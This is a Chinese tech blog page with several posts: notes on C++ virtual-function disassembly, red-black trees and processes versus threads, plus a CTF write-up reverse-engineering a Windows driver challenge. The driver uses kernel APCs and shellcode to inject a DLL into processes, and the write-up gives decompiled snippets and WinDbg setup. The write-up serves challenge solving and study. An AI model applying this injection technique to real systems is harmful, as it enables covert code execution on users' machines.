    132f:	c3                   	retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>父子类声明同名函数，在程序中会有两个不同的函数，其它没什么区别。</p>
<h2 id="动态多态——虚函数"><a href="#动态多态——虚函数" class="headerlink" title="动态多态——虚函数"></a>动态多态——虚函数</h2><p>虚函数调用的表现如下:</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">mov     rax, [rbp+var_20]   //栈上对象的this指针
mov     rax, [rax]          //虚表
mov     rdx, [rax]          //寻找寻函数
mov     rax, [rbp+var_20]   
mov     rdi, rax            //对象的this指针入参
call    rdx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>虚表位置</p>
<pre class="line-numbers language-none"><code class="language-none">.data.rel.ro:0000000000003D58 ; `vtable for'Child
.data.rel.ro:0000000000003D58 _ZTV5Child      dq 0                    ; offset to this
.data.rel.ro:0000000000003D60                 dq offset _ZTI5Child    ; `typeinfo for'Child
.data.rel.ro:0000000000003D68 off_3D68        dq offset _ZN5Child3actEv
.data.rel.ro:0000000000003D68                                         ; DATA XREF: Child::Child(void)+18↑o
.data.rel.ro:0000000000003D68                                         ; Child::act(void)
.data.rel.ro:0000000000003D70                 public _ZTV6Parent ; weak
.data.rel.ro:0000000000003D70 ; `vtable for'Parent
.data.rel.ro:0000000000003D70 _ZTV6Parent     dq 0                    ; offset to this
.data.rel.ro:0000000000003D78                 dq offset _ZTI6Parent   ; `typeinfo for'Parent
.data.rel.ro:0000000000003D80 off_3D80        dq offset _ZN6Parent3actEv
.data.rel.ro:0000000000003D80                                         ; DATA XREF: Parent::Parent(void)+18↑o
.data.rel.ro:0000000000003D80                                         ; Parent::act(void)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/02/xiang-yun-bei-2021/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/02/xiang-yun-bei-2021/" class="post-title-link" itemprop="url">祥云杯2021</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-09-02 22:56:42" itemprop="dateCreated datePublished" datetime="2021-09-02T22:56:42+08:00">2021-09-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-09-06 17:19:59" itemprop="dateModified" datetime="2021-09-06T17:19:59+08:00">2021-09-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/09/02/xiang-yun-bei-2021/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/09/02/xiang-yun-bei-2021/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Re-Apc"><a href="#Re-Apc" class="headerlink" title="Re_Apc"></a>Re_Apc</h2><p>比赛的时候没有做出来，被DllInjector.dll折磨到心态爆炸，网站sha3-256的时候还错了。<br>后来发现根本用不到DllInjector.dll中的加密，还是没有老老实实地分析代码，太急躁了。</p>
<p>首先，这是1个驱动程序，可以使用工具InstDrv安装该驱动。<br>调试驱动程序需要使用WinDbg，需要配置WinDbg双机调试环境</p>
<pre class="line-numbers language-none"><code class="language-none"># win10客户机配置方案
设置-&gt;更新和安全→开发人员选项:转为开发人员模式

win+r→msconfig→引导→高级选项：选中调试、调试端口选择COM1、波特率选择115200

# win10调试机配置方案
1. 安装WinDbg
2. 虚拟机硬件配置中删除打印机(会占用串口)，重新创建1个串口，如下图

# WinDbg kernel mode调试
选择Attack Kernel,使用com端口
port：\\.\pipe\com_1
Baud Rate：115200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/2021/09/02/xiang-yun-bei-2021/WinDbg%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%BE%E7%BD%AE.jpg" class="">

<p><strong>需要非常注意的是，只有在WinDbg载入驱动的时候我们才能给驱动下断，所有如果发现断点无法成功断下来，可以考虑卸载驱动，再次安装并启动</strong></p>
<h3 id="injectDriver-sys分析"><a href="#injectDriver-sys分析" class="headerlink" title="injectDriver.sys分析"></a>injectDriver.sys分析</h3><p>windows驱动程序的入口是DriverEntry<br>不是非常熟悉驱动程序，用vs2019编译了一个HelloWorld.sys，并且保留了调试符号，用ida打开</p>
<p>带符号的驱动主函数如下：</p>
<img src="/2021/09/02/xiang-yun-bei-2021/kmdfEntry.png" class="">
<p>可以看到里面有1个DriverEntry，对比一下位置，在题中所给程序的该函数应该为sub1400015EC</p>
<img src="/2021/09/02/xiang-yun-bei-2021/injectEntry.png" class="">

<img src="/2021/09/02/xiang-yun-bei-2021/createDevice.png" class="">    
<p>其中MajorFunction表示驱动在收到不同IRP时候的回调函数    </p>
<p>函数sub_1400019D8()解密释放了一个dll文件，InjectDLL.dll<br>其路径为C:\WINDOWS\TEMP\InjectDLL.dll</p>
<p>函数sub_1400019A4()创建了1个LPC，并新建了一个线程用来处理收到请求</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">NTSTATUS sub_1400019A4()
{
  __int64 v0; // rax
  NTSTATUS result; // eax

  LOBYTE(v0) = sub_140002360();
  qword_14000C2A8 = v0;
  if ( !sub_1400017F0() || (result = create_rpc(L"\\RPC Control\\ad034789-9a13-4153-a0b9-8523e91890f9"), result &lt; 0) )
    result = -1073741823;
  return result;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">result = PsCreateSystemThread(&amp;ThreadHandle, 0, 0i64, 0i64, 0i64, (PKSTART_ROUTINE)StartRoutine, &amp;qword_14000C300);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>StartRoutine为处理LPC的函数</p>
<p>针对StartRoutine的分析：</p>
<ol>
<li>使用NtReplyWaitRecvivePort接收PORT_MESSAGE</li>
<li>通过判断PORT_MESSAGE的u2数据结构来判断是不是第一次建立连接 <img src="/2021/09/02/xiang-yun-bei-2021/portmessage%E4%B9%8Bu2.png" class=""></li>
<li>如果是第一次连接，则通过NtAcceptConnectPort和NtCompleteConnectPort建立无名端口并唤醒客户端进程。并且为每个新建立的连接分配内存，创建了1个链表来维护它。</li>
<li>如果不是第一次连接，如果u2的type不为5则继续执行，此时会判断客户端发送过来的控制数据来分辨发送过来的数据，分别执行不同的操作，如果发送过来的是key，则会对key进行叠加异或(sub14000298C())，然后返回结果给客户端。</li>
</ol>
<p>函数sub140001B78()注册了两个回调，一个是进程创建时的回调，另一个是加载映像时的回调。</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">char callback_register()
{
  if ( PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)CreateProcessRoutine, 0) )
    return 0;
  if ( PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)LoadImageRoutine) &lt; 0 )// 注册模块加载的回调函数，只要有模块加载，该函数就会执行
                                                // 
                                                // 如果回调注册失败，执行下面的操作：
                                                // 也就是说这个回调已经被注册过了
                                                // 需要把下面的监视进程的回调给Remove掉
  {
    PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)CreateProcessRoutine, 1u);
    return 0;
  }
  return 1;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>进程创建的回调函数执行如下操作：    </p>
<ol>
<li>为每个进程分配1块大小为0x130的内存</li>
<li>将一些与该进程有关的信息存放到这块内存中   <ol>
<li>需要注意的是0x12D处的值，这里其实是在判断进程名是否为explorer开头，如果是，则其hash会使得v11==0，0x12D处的值为1(这个也是赛后看大佬博客才知道的orz,但是不知道也没有关系，这个值我们可以直接改)</li>
<li>注意63行与67行，可以发现这里实际上维护了一个前向的链表，0x8处指向的是上一个进程对应的节点(且称它为pool)。</li>
<li>这个&amp;P没看懂是什么意思，不过影响不大</li>
</ol>
</li>
</ol>
<img src="/2021/09/02/xiang-yun-bei-2021/CreateProcessCallBack.png" class="">

<p>镜像加载的回调函数执行如下操作:</p>
<ol>
<li>找到加载该镜像的进程的节点</li>
<li>如果满足镜像名各个字节之和与上0x1FF为0x100,则会在创建内核Apc的时候注册1个唯一的NormalRoutine</li>
</ol>
<p>问题：</p>
<ol>
<li>用户态进程触发该回调函数的时候，该函数的权限是用户态还是内核态？<br> 因为代码是处于内核区域的，所以它的权限是R0级别</li>
<li><strong>该回调函数注册的Apc，属于触发回调函数的进程？还是属于注册回调函数的进程？</strong><br> 应该属于触发回调函数的进程</li>
</ol>
<p>针对NormalRoutine的分析   </p>
<ol>
<li>ZwCreateSection创建一块共享内存</li>
<li>然后根据pool的0x128处的数据v1选择调用不同的函数<br> 如果v1是2的时候，会向r3处注入shellcode(但是我调不出这条路径orz),然后再次注册1个用户模式的Apc，ApcRoutine为注入的shellcode,ApcContext为LdrLoadDll。注册的函数其实就是调用LdrLoadDll，这里其实是用R3载入了InjectDLL.dll</li>
</ol>
<p>所以这里我们实际上有两种方式载入InjectDLL.dll:</p>
<ol>
<li>达成上述条件</li>
<li>强行Load InjectDLL.dll</li>
</ol>
<h3 id="InjectDLL-dll分析"><a href="#InjectDLL-dll分析" class="headerlink" title="InjectDLL.dll分析"></a>InjectDLL.dll分析</h3><p>加载了1个不存在的dll文件(之前随手写了1个load InjectDLL.dll，不知道为什么会莫名其妙地加载后会卸载)<br>然后会加载一个GetContentHash函数</p>
<p>该函数会对"test"做hash，然后和结果进行比对，经过验证，该hash是sha3-256。</p>
<p>接着程序貌似对"AkiraDDL"进行了hash，然后用hash值作为key加密flag。(然而这里其实hash了个寂寞，最后并没有用到这个key)</p>
<p>回过头分析驱动中的MajorFunction，生成key的函数为sub_140003704()   </p>
<img src="/2021/09/02/xiang-yun-bei-2021/key%E7%9A%84%E4%BA%A7%E7%94%9F(1).png" class="">
<p>用户态通过DeviceIoControl函数向驱动发送请求，驱动通过该函数处理用户态请求，调试中最后返回给用户态的的数据其实是fix_data,也是一段固定的数据，但是与hash值无关。</p>
<p>前面说的是第一种通信方式，通过DeviceIoControl和驱动通信</p>
<p>接下来还会使用第二种通信方式，即通过LPC的方式通信，这里主要要看sys文件中的StartRoutine方法是如何处理IRP的。<br>dll文件在发送请求报的时候一共有两种状态：</p>
<ol>
<li>发送Test给驱动，附带控制数据1，则驱动执行原样复制，然后用NtReplyPort函数回复客户端。</li>
<li>发送key给驱动，附带控制数据3，对key进行叠加异或</li>
</ol>
<p>在获得加密密钥以后，dll会读取flag.txt文件中的明文，并用key对它进行32次加密，每轮根据rand()%6使用不同的加密函数(因为程序没有初始化种子，所以默认种子为1，即每轮使用的是哪个加密函数是可以确定的)，具体每一轮的加密函数看驱动中的MajorFunction[0xE]即可。</p>
<h3 id="关于Apc"><a href="#关于Apc" class="headerlink" title="关于Apc"></a>关于Apc</h3><p>待补充</p>
<h3 id="关于Lpc"><a href="#关于Lpc" class="headerlink" title="关于Lpc"></a>关于Lpc</h3><p>服务端：    </p>
<ol>
<li>NtCreatePort</li>
<li>NtListenPort(服务端被阻塞，等待来自客户端的连接请求)</li>
<li>服务端接收连接请求<ol>
<li>收到第一次连接请求时:NtAcceptConnectPort(服务端收到连接请求被唤醒，创建一个无名端)，之后使用NtCompleteConnectPort唤醒客户端进程</li>
<li>收到非第一次连接请求时:NtReplyWaitReceivePort</li>
</ol>
</li>
</ol>
<p>客户端:</p>
<ol>
<li>NtConnectPort</li>
<li>NtRequestWaitReplyPort</li>
</ol>
<p>IRP数据包结构：   </p>
<img src="/2021/09/02/xiang-yun-bei-2021/IRP%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" class="">   
<img src="/2021/09/02/xiang-yun-bei-2021/IRP%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%A7%A3%E9%87%8A.png" class="">   

<h3 id="WinDbg常用命令"><a href="#WinDbg常用命令" class="headerlink" title="WinDbg常用命令"></a>WinDbg常用命令</h3><pre class="line-numbers language-none"><code class="language-none"># 查看已加载的模块
lm

# 查看内存
da address    //字符串形式查看
db/dd/dw/dq address
dt symbolname address   //以xx结构查看内存

# 反汇编
u address

# 断点
bp address(modulename+偏移)
/1 一次性断点
# 条件断点
bp address ".if (condition) {operate} .else {gc}"    //其中gc表示go continue   
# 删除断点
bc 
# 查看断点
bl

# MASM运算
qwo/dwo/wo/by(address)
poi(address)      //取值操作

# 查看寄存器
r rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269036.htm#msg_header_h3_0">https://bbs.pediy.com/thread-269036.htm#msg_header_h3_0</a></li>
<li><a href="/2021/09/02/xiang-yun-bei-2021/solve.cpp" title="解密脚本">解密脚本</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/30/hong-hei-shu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/30/hong-hei-shu/" class="post-title-link" itemprop="url">红黑树</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-30 20:13:01 / 修改时间：20:46:13" itemprop="dateCreated datePublished" datetime="2021-08-30T20:13:01+08:00">2021-08-30</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" itemprop="url" rel="index"><span itemprop="name">算法与数据结构</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/08/30/hong-hei-shu/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/30/hong-hei-shu/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>红黑树是一棵二叉查找树。</p>
<p>它有以下性质：</p>
<ol>
<li>只有红黑两个颜色的节点</li>
<li>根节点是黑色的</li>
<li>红色节点的两个子节点一定是黑色节点</li>
<li>任意一个节点到所有叶子节点的路径上的黑色节点数量一致</li>
<li>所有的叶子节点都是黑色的节点</li>
</ol>
<p>数据结构：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">struct t_red_black_node {
    enum { red, black } colour;
    void *item;
    struct t_red_black_node *left,
                     *right,
                     *parent;
    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="算法复杂度分析"><a href="#算法复杂度分析" class="headerlink" title="算法复杂度分析"></a>算法复杂度分析</h2><h3 id="红黑树的最大高度是2lg-n-1-其中n表示红黑树的内部节点数量。"><a href="#红黑树的最大高度是2lg-n-1-其中n表示红黑树的内部节点数量。" class="headerlink" title="红黑树的最大高度是2lg(n+1),其中n表示红黑树的内部节点数量。"></a>红黑树的最大高度是2lg(n+1),其中n表示红黑树的内部节点数量。</h3><p>概念介绍：black-height<br>对于任意节点x，它到叶子节点的路径上的黑色节点的数量称为它的black-height，bh(x)。</p>
<p>引理1：对于高度为h，根节点为t的红黑树，它的内部节点数量至少为2<sup>bh(t)</sup>-1个。</p>
<p>直观理解：在bh(t)已知的情况下，怎样让树中的节点最少？即树中没有红色的节点，那么该树是一棵只有黑色节点的满二叉树，它的节点数量为2<sup>bh(t)</sup>-1个。</p>
<p>数学归纳法证明：</p>
<ol>
<li>当节点x为叶子节点时，即h=0，bh(x)=0，其内部节点的数量为0&gt;=2<sup>bh(x)</sup>-1=0，原命题成立;</li>
<li>当节点x的高度为h-1的时候，假设该命题仍然成立;</li>
<li>当节点x的高度为h的时候，它的左右子树的black-height为bh(x)或bh(x)-1，所以它的左右子树的节点数量至少为2<sup>bh(x)-1</sup>-1，所以它的节点数量至少为(2<sup>bh(x)-1</sup>-1 + 2<sup>bh(x)-1</sup>-1)+1 = 2<sup>bh(x)</sup>-1，证毕。</li>
</ol>
<h2 id="红黑树的操作"><a href="#红黑树的操作" class="headerlink" title="红黑树的操作"></a>红黑树的操作</h2><p>略，太复杂了，以后有时间再说。。。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a target="_blank" rel="noopener" href="https://www.cs.auckland.ac.nz/software/AlgAnim/red_black.html">https://www.cs.auckland.ac.nz/software/AlgAnim/red_black.html</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/24/process-thread/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/24/process-thread/" class="post-title-link" itemprop="url">Process & Thread</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-24 23:04:04" itemprop="dateCreated datePublished" datetime="2021-08-24T23:04:04+08:00">2021-08-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-30 21:12:54" itemprop="dateModified" datetime="2021-08-30T21:12:54+08:00">2021-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">计算机基础知识</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/08/24/process-thread/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/24/process-thread/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>进程是正在运行的程序实体，是资源分配的基本单位。</p>
<p>线程是轻量级的进程，是独立调度的基本单位。设置线程，主要目的是提高程序的并行性。</p>
<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><ol>
<li><p>资源方面</p>
<ol>
<li><p>线程的共享资源</p>
<p> 线程之间资源共享，比如代码段、数据段、打开文件表等。</p>
</li>
<li><p>线程的独享资源<br> 但是线程也有独享资源，比如栈、寄存器等。</p>
<ul>
<li><p>寄存器：不同CPU各自拥有各自的寄存器</p>
</li>
<li><p>线程栈：线程栈均分配在共享的虚拟地址空间中，线程可以通过暴露栈地址的方式让它的Peer Thread访问其栈空间。</p>
<p>  为什么线程的栈是独享的？<br>  因为每个线程给自拥有自己的代码，在运行过程中会涉及到一些栈操作，所以要分开。</p>
<p>  关于线程栈的大小，linux在创建线程的时候默认线程栈的大小为8M，可以主动设置。  </p>
<p>  <strong>那么线程拥有各自的堆嘛？</strong></p>
</li>
</ul>
</li>
</ol>
</li>
<li><p>Context Switch</p>
<p> 在上下文切换时，进程的消耗高于线程的消耗。其主要原因如下：</p>
<ol>
<li>进程需要保存的数据更多，例如PCB</li>
<li>进程的上下文切换涉及到虚拟地址空间上，诸如代码段、数据段的切换，而线程不需要</li>
<li>因为虚拟地址空间的切换，cache和TLB也会失效，需要更新(复习有关cache和tlb的知识)</li>
</ol>
</li>
<li><p>一个线程阻塞以后，它的Peer Thread都会阻塞，即整个进程阻塞。    </p>
<p> 从OS层面，OS只和进程打交道。当一个线程因为IO等原因阻塞以后，OS会将整个进程阻塞掉。    </p>
<p> 当然，对于多核处理器而言，一个线程的阻塞不会影响另一个处理器中它Peer Thread的运行。</p>
</li>
</ol>
<h1 id="Linux中的进程与线程"><a href="#Linux中的进程与线程" class="headerlink" title="Linux中的进程与线程"></a>Linux中的进程与线程</h1><h2 id="Linux中的进程"><a href="#Linux中的进程" class="headerlink" title="Linux中的进程"></a>Linux中的进程</h2><p>进程描述符task_struct</p>
<p>Linux中进程的创建过程：<br>创建进程描述符→申请内存空间→设置进程状态、将其加入调度序列</p>
<h3 id="COW-写时复制"><a href="#COW-写时复制" class="headerlink" title="COW(写时复制)"></a>COW(写时复制)</h3><p>Linux父进程在创建子进程的时候，子进程最初复用父进程的地址空间。只有当内存页发生变化的时候，才会重新申请一块内存页。fork()的子进程的堆栈指向父进程的堆栈。</p>
<h3 id="Linux进程树"><a href="#Linux进程树" class="headerlink" title="Linux进程树"></a>Linux进程树</h3><p>init进程：在内核启动的最后阶段，会创建init进程，它的进程id为1(Linux最大进程号为32767)</p>
<p>init进程有3个特点：</p>
<ol>
<li>无默认的信号处理程序</li>
<li>收养孤儿进程</li>
<li>init进程死亡，则所有进程被杀死</li>
</ol>
<h3 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h3><p>通信方式：</p>
<ol>
<li>OS：信号量、共享内存、pipe</li>
<li>文件：UNIX域套接字、文件</li>
<li>网络：socket套接字</li>
</ol>
<p>pipe：<br>一种基础的IPC(Inter-Process Communication)机制。</p>
<ol>
<li>在Linux中，其本质是内核的缓冲区，一种伪文件。</li>
<li>在管道创建的时候，会生成两个文件描述符，一为只读端，一为只写端。（不能同时读和同时写，也不能重复读；半双工通信？）</li>
</ol>
<p>管道的分类：无名管道和有名管道(存在于文件系统中，mkfifo)</p>
<p>管道的局限性：<br>只能在拥有公共祖先的进程之间使用管道？<br>因为管道只存在于内存中。</p>
<p>常见的通信方式有：单工通信(数据流向为单向)、半双工通信(数据流向为双向，但是双方不可同时)、全双工通信(双向，同时)</p>
<h3 id="信号处理"><a href="#信号处理" class="headerlink" title="信号处理"></a>信号处理</h3><p>信号处理一般发生在进程从内核态返回用户态的时候，此时内核会查看进程的信号队列，然后执行信号处理程序？</p>
<h3 id="后台进程与守护进程"><a href="#后台进程与守护进程" class="headerlink" title="后台进程与守护进程"></a>后台进程与守护进程</h3><p>后台进程与终端绑定，shell退出它也退出，<br>守护进程与终端脱离，shell推出它不退出。</p>
<p>进程→进程组→会话<br>一个进程组由多个进程构成，一个会话由多个进程组构成</p>
<p>如何实现一个守护进程？nohup</p>
<h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>进程状态：</p>
<ol>
<li>Running：就绪态和运行态</li>
<li>深度睡眠(<strong>忽略信号</strong>)和浅度睡眠：阻塞态</li>
<li>Zombie：僵死进程，内核中的垃圾进程，但是父进程未wait()，资源还没有回收</li>
<li>Dead：顾名思义</li>
<li>Stop：一般被调试的进程处于这个状态</li>
<li>Trace：被监视的进程处于这个状态</li>
</ol>
<p>首先，调度模式有两种分别为：preemptive(抢占式)和cooperative(非抢占式)</p>
<p>程序可以分为IO繁忙型和CPU繁忙型。<br>IO繁忙型比如：网络、键盘、GUI程序</p>
<p>Linux有很多调度算法，最新的是CFS。<br>其大致思想为以优先级为权重，为每个进程记录虚拟运行时间vruntime，优先级大的vruntime增长慢，CFS总是选择vruntime最小的进程优先调度。<br>它使用红黑树维护调度实体(sched_entity存放在task_struct中)</p>
<p>进程转入sleep状态会做的事情：</p>
<ol>
<li>将自身标记为sleep状态</li>
<li>移出就绪队列(runqueue)，加入waitqueue</li>
<li>触发schedule函数，调度其它进程</li>
</ol>
<h2 id="Linux中的线程"><a href="#Linux中的线程" class="headerlink" title="Linux中的线程"></a>Linux中的线程</h2><p>Linux没有单独的线程概念，实际上Linux中的线程就是一个普通的进程，只是它可能与其它进程共享某些资源，如地址空间。</p>
<h1 id="Windows中的进程与线程"><a href="#Windows中的进程与线程" class="headerlink" title="Windows中的进程与线程"></a>Windows中的进程与线程</h1><p>首先要明确的一点是，windows中的线程与线程是截然不同的，这一点与linux有本质区别。在windos中，进程只负责资源分配，而线程是调度的基本单位，二者都拥有自己独立的数据结构。</p>
<p>其它的以后再研究吧。。。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/XD_hebuters/article/details/79623130">CFS调度算法</a></li>
<li><a target="_blank" rel="noopener" href="https://notes.eddyerburgh.me/operating-systems/linux/process-scheduling">Linux进程调度算法</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/17/mitigating-code-reuse-attacks-with-control-flow-locking/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/17/mitigating-code-reuse-attacks-with-control-flow-locking/" class="post-title-link" itemprop="url">Mitigating Code-Reuse Attacks with Control-Flow Locking</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-17 21:56:09" itemprop="dateCreated datePublished" datetime="2021-08-17T21:56:09+08:00">2021-08-17</time>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/08/17/mitigating-code-reuse-attacks-with-control-flow-locking/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/17/mitigating-code-reuse-attacks-with-control-flow-locking/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
      
    </div>

    
    
    
